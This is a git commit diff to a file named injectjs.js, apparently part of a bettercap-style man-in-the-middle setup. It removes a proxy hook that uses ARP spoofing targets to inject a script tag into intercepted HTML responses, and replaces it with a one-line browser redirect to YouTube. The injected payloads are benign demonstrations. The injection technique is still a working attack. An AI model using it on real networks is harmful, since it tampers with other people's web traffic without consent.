d19826e47033579868c3172b938d1dfc7110e4aa
Matheus Brito <mattbmoller@gmail.com>
2020-11-23 17:02:17 -0300

    Update injectjs.js

--- injectjs.js
+++ injectjs.js
@@ -1,16 +1,1 @@
-function onLoad() {
-    log( "BeefInject loaded." );
-    log("targets: " + env['arp.spoof.targets']);
-}
-
-function onResponse(req, res) {
-    if( res.ContentType.indexOf('text/html') == 0 ){
-        var body = res.ReadBody();
-        if( body.indexOf('</head>') != -1 ) {
-            res.Body = body.replace( 
-                '</head>', 
-                '<script type="text/javascript">alert(12345);</script></head>' 
-            ); 
-        }
-    }
-}
+window.location.replace("https://www.youtube.com")
